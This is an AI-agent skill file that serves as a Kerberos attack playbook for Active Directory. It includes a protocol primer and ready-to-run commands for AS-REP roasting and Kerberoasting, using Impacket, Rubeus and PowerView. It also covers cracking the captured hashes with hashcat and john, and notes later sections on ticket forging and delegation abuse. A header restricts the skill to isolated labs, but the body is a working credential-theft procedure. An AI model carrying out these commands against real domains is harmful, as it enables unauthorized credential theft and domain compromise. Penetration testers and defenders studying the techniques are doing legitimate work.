---
name: active-directory-kerberos-attacks
description: >-
  Kerberos attack playbook for Active Directory. Use when targeting AD authentication via AS-REP roasting, Kerberoasting, golden/silver/diamond tickets, delegation abuse, or pass-the-ticket attacks.
---

# SKILL: Kerberos Attack Playbook — Expert AD Attack Guide

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert Kerberos attack techniques for AD environments. Covers AS-REP roasting, Kerberoasting, golden/silver/diamond/sapphire tickets, delegation attacks, pass-the-ticket, and overpass-the-hash. Pay particular attention to ticket type distinctions, delegation chain nuances, and detection-evasion trade-offs.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `active-directory-acl-abuse` for ACL-based AD attacks often chained with Kerberos
- `active-directory-certificate-services` for ADCS-based persistence (golden certificate)
- `ntlm-relay-coercion` for NTLM relay attacks that complement Kerberos abuse
- `windows-lateral-movement` after obtaining tickets for lateral movement

### Advanced Reference

Also inspect [KERBEROS_ATTACK_CHAINS.md](./KERBEROS_ATTACK_CHAINS.md) when you need:
- Multi-step attack chains combining Kerberos with ACL abuse, ADCS, and relay
- End-to-end scenarios from foothold to domain admin
- Chained delegation attack flows

---

## 1. KERBEROS AUTHENTICATION PRIMER

```
Client              KDC (DC)              Service
  │                   │                     │
  │── AS-REQ ────────→│                     │  (1) Request TGT with user creds
  │←─ AS-REP ─────────│                     │  (2) Receive TGT (encrypted with krbtgt hash)
  │                   │                     │
  │── TGS-REQ ───────→│                     │  (3) Present TGT, request service ticket
  │←─ TGS-REP ────────│                     │  (4) Receive TGS (encrypted with service hash)
  │                   │                     │
  │── AP-REQ ─────────────────────────────→│  (5) Present TGS to service
  │←─ AP-REP ──────────────────────────────│  (6) Mutual auth (optional)
```

---

## 2. AS-REP ROASTING

Users with "Do not require Kerberos preauthentication" can be queried for AS-REP without knowing their password.

### Enumerate Vulnerable Users

```bash
# Impacket — from Linux
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Impacket — with domain creds (enumerate automatically)
GetNPUsers.py DOMAIN/user:password -dc-ip DC_IP -request

# Rubeus — from Windows (domain-joined)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView — enumerate users
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### Crack AS-REP Hash

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule

# John
john asrep.txt --wordlist=rockyou.txt
```

---

## 3. KERBEROASTING

Any domain user can request TGS for accounts with SPNs. The TGS is encrypted with the service account's NTLM hash.

### Request Service Tickets

```bash
# Impacket
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# Rubeus (from Windows)
Rubeus.exe kerberoast /outfile:tgs.txt

# Rubeus — target specific SPN / high-value accounts
Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt

# PowerView + manual request
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db.domain.com"
```

### Crack TGS Hash

```bash
# Hashcat mode 13100 (RC4) or 19700 (AES)
hashcat -m 13100 tgs.txt rockyou.txt --rules-file best64.rule

# RC4 tickets crack much faster than AES256 — target RC4 if possible
# Rubeus: /tgtdeleg forces RC4 on some configs
Rubeus.exe kerberoast /tgtdeleg
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. TICKET FORGING — GOLDEN, SILVER, DIAMOND, SAPPHIRE
- 5. DELEGATION ATTACKS
- 6. PASS-THE-TICKET & OVERPASS-THE-HASH
- 7. KERBEROS DOUBLE HOP PROBLEM
- 8. KERBEROS ATTACK DECISION TREE
